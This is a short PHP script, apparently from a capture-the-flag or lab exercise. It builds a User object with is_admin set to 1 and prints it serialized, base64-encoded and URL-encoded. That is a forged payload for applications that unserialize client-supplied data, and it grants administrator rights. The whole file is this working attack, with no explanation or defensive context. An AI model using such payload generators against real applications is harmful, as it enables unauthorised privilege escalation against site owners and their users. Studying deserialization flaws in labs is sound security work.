<?php
class User
{
    public $username;
    public $is_admin;
    public $remember;
}

$obj = new User();
$obj->is_admin = 1;
$obj->username = bin2hex(random_bytes(10));
echo urlencode(base64_encode(serialize($obj)));

